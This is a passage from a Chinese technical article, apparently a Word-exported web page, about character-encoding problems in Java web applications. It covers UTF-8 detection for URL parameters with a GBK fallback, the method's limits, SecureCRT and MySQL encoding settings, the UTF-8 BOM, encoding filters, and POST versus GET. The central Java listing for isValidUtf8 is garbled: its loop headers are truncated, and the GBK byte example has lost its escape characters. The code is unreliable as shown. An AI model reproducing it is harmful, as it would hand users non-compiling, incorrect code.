mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的设置。所以，接下来的解决办法就只能是让自己的程序多一点智能：根据内容来分析编码是否</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　比较幸运的是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码相当有规律，所以可以通过分析传输过来的链接内容，来判断是否是正确的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">字符，如果是，则以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">处理之，如果不是，则使用客户默认编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">比如</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"GBK")</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，下面是一个判断是否</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的例子，如果你了解相应规律，就容易理解。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">public static boolean isValidUtf8(byte[] b,int aMaxCount){</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">int lLen=b.length,lCharCount=0;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">for(int i=0;i</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">byte lByte=b[i++];//to fast operation, ++ now, ready for the following for(;;)</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">if(lByte&gt;=0) continue;//&gt;=0 is normal ascii</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">if(lByte&lt;(byte)0xc0 || lByte&gt;(byte)0xfd) return false;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">int lCount=lByte&gt;(byte)0xfc?5:lByte&gt;(byte)0xf8?4</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">:lByte&gt;(byte)0xf0?3:lByte&gt;(byte)0xe0?2:1;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">if(i+lCount&gt;lLen) return false;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">for(int j=0;j=(byte)0xc0) return false;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">}</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">return true;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">}</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　相应地，一个使用上述方法的例子如下：</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">public static String getUrlParam(String aStr,String aDefaultCharset)</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">throws UnsupportedEncodingException{</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">if(aStr==null) return null;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">byte[] lBytes=aStr.getBytes("ISO-8859-1");</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">return new String(lBytes,StringUtil.isValidUtf8(lBytes)?"utf8":aDefaultCharset);</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">}</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　不过，该方法也存在缺陷，如下两方面：</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">没有包括对用户默认编码的识别，这可以根据请求信息的语言来判断，但不一定正确，因为我们有时候也会输入一些韩文，或者其他文字。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">可能会错误判断</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">字符，一个例子是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">学习</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字，其</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GBK</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">" xd1xa7xcfxb0"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，如果使用上述</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">isValidUtf8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法判断，将返回</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">true</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。可以考虑使用更严格的判断方法，不过估计效果不大。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　有一个例子可以证明</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">google</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">也遇到了上述问题，而且也采用了和上述相似的处理方法，比如，如果在地址栏中输入</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"http://www.google.com/search?hl=zh-CN&amp;newwindow=1&amp;q=</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">学习</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">google</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">将无法正确识别，而其他汉字一般能够正常识别。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　最后，应该补充说明一下，如果不使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">rewrite</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">规则，或者通过表单提交数据，其实并不一定会遇到上述问题，因为这时可以在提交数据时指定希望的编码。另外，中文文件名确实会带来问题，应该谨慎使用。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">其它</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　下面描述一些和编码有关的其他问题。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6.1. SecureCRT</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　除了浏览器和控制台与编码有关外，一些客户端也很有关系。比如在使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">SecureCRT</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">连接</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">时，应该让</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">SecureCRT</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的显示编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">不同的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">session</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，可以有不同的编码设置</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的编码环境变量保持一致。否则看到的一些帮助信息，就可能是乱码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　另外，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">mysql</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">有自己的编码设置，也应该保持和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">SecureCRT</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的显示编码一致。否则通过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">SecureCRT</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">执行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">sql</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">语句的时候，可能无法处理中文字符，查询结果也会出现乱码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">Utf-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件，很多编辑器</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">比如记事本</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">会在文件开头增加三个不可见的标志字节，如果作为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">mysql</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的输入文件，则必须要去掉这三个字符。</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">vi</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">保存可以去掉这三个字符</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。一个有趣的现象是，在中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">windows</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">下，创建一个新</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">txt</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件，用记事本打开，输入</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">连通</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字，保存，再打开，你会发现两个字没了，只留下一个小黑点。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6.2. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">过滤器</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　如果需要统一设置编码，则通过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">filter</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">进行设置是个不错的选择。在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">filter class</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中，可以统一为需要的请求或者回应设置编码。参加上述</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。这个类</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">apache</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">已经给出了可以直接使用的例子</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">SetCharacterEncodingFilter</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6.3. POST</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　很明显，以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">POST</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">提交信息时，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">有更好的可读性，而且可以方便的使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">来处理字符集问题。但</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法形成的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">能够更容易表达网页的实际内容，也能够用于收藏。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　从统一的角度考虑问题，建议采用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法，这要求在程序中获得参数是进行特殊处理，而无法使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的便利，如果不考虑</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">rewrite</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，就不存在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">IE</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">问题，可以考虑通过设置</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URIEncoding</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">来方便获取</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中的参数。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6.4. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">简繁体编码转换</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
